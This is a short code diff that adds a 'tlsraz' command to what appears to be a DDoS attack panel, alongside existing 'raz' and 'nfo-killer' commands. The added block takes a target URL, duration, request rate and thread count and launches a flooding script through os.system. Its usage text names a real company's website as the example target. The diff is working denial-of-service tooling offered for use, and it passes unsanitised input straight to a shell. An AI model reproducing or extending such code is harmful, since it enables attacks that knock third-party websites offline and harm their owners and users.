@@ -349,6 +349,17 @@ def main():
                 print('Usage: raz <web> <waktu> <rps> <threads>')
                 print('Example: raz https://mikrotik.com 60 80 1500')
 
+         elif "tlsraz" in cnc:
+            try:
+                target = cnc.split()[1]
+                time = cnc.split()[2]
+                Rate = cnc.split()[3]
+                threads = cnc.split()[4]
+                os.system(f'python3 lintar.py {target} {time} {Rate} {threads}')
+            except IndexError:
+                print('Usage: tlsraz <web> <waktu> <rps> <threads>')
+                print('Example: tlsraz https://mikrotik.com 60 80 1500')
+
         elif "nfo-killer" in cnc:
             try:
                 ip = cnc.split()[1]
